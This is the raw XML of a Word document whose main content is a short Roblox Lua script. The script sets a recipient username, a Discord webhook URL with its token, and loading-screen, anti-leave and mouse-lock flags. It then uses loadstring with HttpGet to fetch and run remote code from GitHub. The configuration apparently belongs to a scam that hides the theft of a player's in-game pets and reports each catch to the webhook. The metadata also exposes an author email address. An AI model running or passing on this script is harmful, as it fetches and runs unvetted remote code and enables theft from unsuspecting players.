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C16A" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>UserName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "RPH" -- good pets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6275D67F" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Webhook</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "https://discord.com/api/webhooks/1135779879577726996/MwWvV4TU9VO-ujhNBQQJBIMWVH8tpzuC9pHOBFI-84UW2UUeNzqBKW1TdlawYxtfiYrs" -- pings for pets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB2C1EB" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>UserName2 = "RPH" -- bad pets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC630E9" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="274F1AA3" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>G.LoadingScreen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = true -- make it true if you want the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>loadingscreen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="20BD9757" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>G.AntiLeave</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = true -- make it true if you want the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>antileave</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="246399F5" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>G.MouseLock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = true -- make it true if you want the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>mouselock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1C160C12" w14:textId="77777777" w:rsidR="007D074B" w:rsidRDefault="007D074B" w:rsidP="007D074B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B41656C" w14:textId="14D9CDA2" w:rsidR="001C0084" w:rsidRDefault="007D074B" w:rsidP="00B278E5">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="001C008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01A0" w14:textId="77777777" w:rsidR="00083581" w:rsidRDefault="00083581">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="49CAD88B" w14:textId="77777777" w:rsidR="00083581" w:rsidRDefault="0008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2FF86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8A3A" w14:textId="77777777" w:rsidR="00083581" w:rsidRDefault="00083581">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="0F4A1E66" w14:textId="77777777" w:rsidR="00083581" w:rsidRDefault="00083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CA6A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A1F2C7" wp14:editId="31EBA72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978975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720D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877EAAB" wp14:editId="6B726CB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8ECF8C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32752">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="961033096">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="271088462">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1289773745">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1631596691">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1991671224">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1754430627">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="683439258">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="508644691">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="88841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81"/>
    <w:rsid w:val="0000092C"/>
    <w:rsid w:val="00047CB1"/>
    <w:rsid w:val="00083581"/>
    <w:rsid w:val="001C0084"/>
    <w:rsid w:val="003C1C78"/>
    <w:rsid w:val="003E195B"/>
    <w:rsid w:val="007D074B"/>
    <w:rsid w:val="007F7DCE"/>
    <w:rsid w:val="00A5155C"/>
    <w:rsid w:val="00AE5B7F"/>
    <w:rsid w:val="00B278E5"/>
    <w:rsid w:val="00B46E46"/>
    <w:rsid w:val="00DE0861"/>
    <w:rsid w:val="00E21118"/>
    <w:rsid w:val="00E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874C"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{B759D499-54E5-B240-ACB1-CEE61586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C4E3A13-EC03-FD4B-9FED-E561F88EA33F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raphaeldelatorre23@gmail.com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%7b6C4E3A13-EC03-FD4B-9FED-E561F88EA33F%7dtf50002038.dotx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raphaeldelatorre23@gmail.com</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>raphaeldelatorre23@gmail.com</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-08-01T03:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-08-01T03:54:00Z</dcterms:modified>
</cp:coreProperties>
</file>